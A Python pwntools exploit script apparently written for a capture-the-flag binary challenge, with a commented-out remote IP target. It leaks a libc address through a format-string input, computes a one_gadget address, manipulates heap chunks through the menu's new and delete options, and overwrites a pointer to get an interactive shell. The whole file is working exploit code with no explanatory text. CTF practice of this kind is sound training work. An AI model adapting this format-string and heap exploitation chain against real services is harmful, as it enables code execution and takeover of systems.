#!/usr/bin/python
#coding=utf-8
from pwn import *
context.binary = "./pwn"
context.terminal = ['gnome-terminal','-x','sh','-c']
context.log_level = 'debug'
# p = remote('123.56.52.128','10012')
p = process('./pwn')
elf = ELF('./pwn')
libc = elf.libc
one = [0x45226,0x4527a,0xf0364,0xf1207]
def show_name():
	p.sendlineafter(':','1')
def new(payload):
	p.sendlineafter(':','2')
	p.sendafter(':\n',payload)
def delete(idx):
	p.sendlineafter(':','3')
	p.sendlineafter(':',str(idx))
def show():
	p.sendlineafter(':','4')
def exit():
	p.sendlineafter(':','5')

p.recvuntil(': ')
p.sendline('%11$p')
p.recvuntil('CHOICE :')
p.recvuntil('CHOICE ')
show_name()
p.recvuntil(':')
libc_base = int(p.recvuntil('\n',drop=True)[2:],16)-240-libc.sym['__libc_start_main']
one_gadget = libc_base+one[2]
info(hex(libc_base))
new('bbb\n')
new('\x00'*0x18+p64(one_gadget)+'\n')

delete(1)
delete(0) 

show()
p.recvuntil('1:')
heap_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
info(hex(heap_addr))

p.sendlineafter(':','23333')
# gdb.attach(p,'''b malloc
# 				b *0x7ffff74ea467
# 				b *0x7ffff7ae0d42''')

payload = 'a'*0x20+p64(heap_addr+0x20)[:-1]
# gdb.attach(p)
p.sendafter('INPUT:',payload)
# pause()
p.interactive()